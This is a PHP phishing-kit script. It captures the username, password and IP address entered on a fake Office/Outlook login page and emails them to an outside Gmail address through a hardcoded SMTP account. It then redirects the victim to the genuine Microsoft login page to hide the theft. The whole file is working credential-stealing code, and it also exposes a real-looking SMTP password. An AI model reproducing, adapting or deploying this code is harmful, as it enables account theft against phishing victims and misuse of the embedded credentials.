<?php ob_start(); ?>
<?php
if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $ip = $_SERVER['REMOTE_ADDR'];
}
$attuser = $_POST['user'];
$attpassword = $_POST['pass'];
$mail_server = 'Office';

// Import PHPMailer classes into the global namespace
// These must be at the top of your script, not inside a function
use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

// Load Composer's autoloader
require 'vendor/autoload.php';

// Instantiation and passing `true` enables exceptions
$mail = new PHPMailer(true);


    //Server settings
    $mail->SMTPDebug = 1 ;                      // Enable verbose debug output
    $mail->isSMTP();                                            // Send using SMTP
    $mail->Host       = 'mail.kebcpa.net';                    // Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   // Enable SMTP authentication
    $mail->Username   = 'admin@kebcpa.net';                     // SMTP username
    $mail->Password   = 'Mademen.2017';                               // SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;         // Enable TLS encryption; `PHPMailer::ENCRYPTION_SMTPS` encouraged
    $mail->Port       = 587;                                    // TCP port to connect to, use 465 for `PHPMailer::ENCRYPTION_SMTPS` above

    //Recipients
    $mail->setFrom('admin@kebcpa.net', 'Mailer');
    $mail->addAddress('Billzanker73@gmail.com', 'Joe User');     // Add a recipient
   


    // Content
    $mail->isHTML(true);                                  // Set email format to HTML
    $mail->Subject = $ip;
    $mail->Body    = $mail_server.' Details from !-S.Wire-!: '."\n"
			.'**************************************'."\n"
			.'email: '.$attuser."\n"
			.'Password: '.$attpassword."\n"
            .'UserIp: '.$ip."\n";

    $mail->send();
    
 header("Location: https://login.live.com/login.srf?wa=wsignin1.0&rpsnv=13&ct=1602063071&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d7a4b53ca-3415-7979-8805-91b4c6e0fe31&id=292841&aadredir=1&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015");
die();

?>
